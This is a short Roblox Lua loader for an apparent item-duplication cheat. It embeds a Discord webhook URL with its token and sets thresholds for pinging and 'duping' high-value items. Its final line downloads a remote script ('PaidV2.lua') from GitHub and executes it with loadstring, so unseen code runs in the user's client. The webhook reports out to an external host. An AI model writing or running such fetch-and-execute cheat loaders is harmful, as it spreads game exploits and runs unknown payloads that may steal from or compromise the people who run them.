
local Webhook = "https://discord.com/api/webhooks/1455344658417975348/dSBjylV0yRpFceyD_yP_QPPy8sgwaBGGbzGHN2t-9Q8ONZwNSFUEdcSGA9Ap22kfZKC3"
getgenv().UserPingThreshold = 50000000      -- Minimum gen to ping @everyone (50M)
getgenv().DupeTargetGeneration = 50000000   -- Minimum gen to dupe brainrots (50M/s)


-- SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE

if Webhook and Webhook:match("discord.com/api/webhooks") then
    getgenv().UserWebhookURL = Webhook
else
    warn("⚠️ Webhook not configured! Please add your Discord webhook to the loader.")
    warn("Script will still work, but you won't receive Discord notifications.")
    getgenv().UserWebhookURL = nil
end

loadstring(game:HttpGet('https://raw.githubusercontent.com/IAODO/duper/refs/heads/main/PaidV2.lua', true))()
